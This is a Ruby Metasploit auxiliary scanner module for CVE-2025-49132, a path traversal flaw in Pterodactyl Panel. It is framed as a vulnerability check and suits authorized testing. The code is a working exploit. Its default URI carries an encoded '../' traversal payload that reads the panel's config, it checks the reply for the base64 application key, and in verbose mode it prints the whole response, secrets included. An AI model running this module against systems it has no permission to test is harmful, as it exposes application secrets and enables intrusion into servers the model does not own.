##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Pterodactyl Panel Path Traversal (CVE-2025-49132)',
        'Description'    => 'This module checks for the CVE-2025-49132 vulnerability in Pterodactyl Panel.',
        'Author'         => [ 'N05ec' ],
        'License'        => MSF_LICENSE,
        'References'     => [
          ['CVE', '2025-49132']
        ],
        'DisclosureDate' => '2025-06-20',
        'Notes'          => {
          'Stability'   => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The target URI', '/locales/locale.json?locale=..%2F..%2Fconfig&namespace=app']),
        OptString.new('METHOD', [true, 'HTTP Method', 'GET'])
      ]
    )
  end

  def run_host(ip)
    begin
      uri = normalize_uri(datastore['TARGETURI'])

      res = send_request_cgi({
        'method'  => datastore['METHOD'],
        'uri'     => uri,
        'headers' => {
          'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
        }
      })

      if res && res.code == 200
        print_good("Successfully connected to #{ip}")
        vprint_status("Response: #{res.body}") 

        if res.body.include?('{"app":{"version":') && res.body.include?('"key":"base64')
          print_good("Vulnerable: #{ip}")
          report_vuln(
            host: ip,
            name: self.name,
            refs: self.references,
            info: 'Host is vulnerable to CVE-2025-49132'
          )
        else
          print_status("Not vulnerable: #{ip}")
        end
      else
        print_error("Connection failed: #{res ? res.code : 'No response'}")
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      print_error("Connection failed")
    rescue ::Errno::EPIPE, ::Errno::ECONNRESET
      print_error("Connection reset")
    rescue => e
      print_error("Unexpected error: #{e.message}")
    end
  end
end
